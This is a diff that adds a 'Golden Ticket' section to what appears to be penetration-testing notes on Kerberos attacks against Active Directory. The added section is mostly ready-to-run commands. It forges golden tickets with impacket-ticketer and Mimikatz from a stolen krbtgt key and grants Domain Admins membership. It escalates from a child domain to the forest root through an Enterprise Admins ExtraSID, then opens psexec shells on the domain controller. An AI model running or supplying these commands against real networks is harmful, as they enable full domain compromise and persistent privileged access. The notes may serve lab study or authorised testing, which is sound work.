@@ -59,6 +59,90 @@ impacket-ticketer -nthash <krbtgt_NT> -domain-sid <SID> -domain corp.local admin
 ```
 Silver: confirm SPN/account mapping and accepted encryption. Golden: needs the relevant `krbtgt` key; domain/forest boundaries and effective service authorization still apply. Modern PAC signatures/validation, account identity data, encryption requirements, key rotation, and DC patch state can invalidate older forging examples. These are deeper lab paths, not a shortcut from an arbitrary service hash. [Impacket ticketer](https://github.com/fortra/impacket/blob/master/examples/ticketer.py).
 
+## Golden Ticket
+
+Requires the domain `krbtgt` key.
+
+```text
+512 = Domain Admins
+513 = Domain Users
+519 = Enterprise Admins
+```
+
+### Impacket
+
+```bash
+impacket-ticketer \
+  -aesKey <KRBTGT_AES256> \
+  -domain-sid <DOMAIN_SID> \
+  -domain <DOMAIN_FQDN> \
+  -user-id <USER_RID> \
+  -groups 512,513 \
+  <USER>
+
+export KRB5CCNAME=$PWD/<USER>.ccache
+klist
+
+impacket-psexec -k -no-pass \
+  <DOMAIN_FQDN>/<USER>@<DC_FQDN>
+```
+
+No DNS:
+
+```bash
+impacket-psexec -k -no-pass -target-ip <DC_IP> \
+  <DOMAIN_FQDN>/<USER>@<DC_FQDN>
+```
+
+Use `-nthash <KRBTGT_NT_HASH>` instead of `-aesKey` if required.
+
+### Child Domain -> Forest Root
+
+Add the root domain's Enterprise Admins SID as an ExtraSID:
+
+```text
+<ROOT_DOMAIN_SID>-519
+```
+
+```bash
+impacket-ticketer \
+  -aesKey <CHILD_KRBTGT_AES256> \
+  -domain-sid <CHILD_DOMAIN_SID> \
+  -domain <CHILD_DOMAIN_FQDN> \
+  -user-id <USER_RID> \
+  -groups 512,513 \
+  -extra-sid <ROOT_DOMAIN_SID>-519 \
+  <USER>
+
+export KRB5CCNAME=$PWD/<USER>.ccache
+
+impacket-psexec -k -no-pass \
+  <CHILD_DOMAIN_FQDN>/<USER>@<ROOT_DC_FQDN>
+```
+
+### Mimikatz
+
+```text
+kerberos::purge
+
+kerberos::golden /user:<USER> /id:<USER_RID> /domain:<DOMAIN_FQDN> /sid:<DOMAIN_SID> /aes256:<KRBTGT_AES256> /groups:512,513 /ptt
+```
+
+Child -> root:
+
+```text
+kerberos::golden /user:<USER> /id:<USER_RID> /domain:<CHILD_DOMAIN_FQDN> /sid:<CHILD_DOMAIN_SID> /aes256:<CHILD_KRBTGT_AES256> /groups:512,513 /sids:<ROOT_DOMAIN_SID>-519 /ptt
+```
+
+Verify:
+
+```cmd
+klist
+dir \\<DC_FQDN>\c$
+```
+
+> If PTT behaves strangely inside Evil-WinRM/PsExec: forge the ticket on Kali with `impacket-ticketer`, set `KRB5CCNAME`, and use `impacket-psexec -k -no-pass`.
+
 MSSQL ticket accepted? Check the resulting login and role in [MSSQL enumeration](../enum/mssql.md#identity-and-rights).
 
 ## Delegation
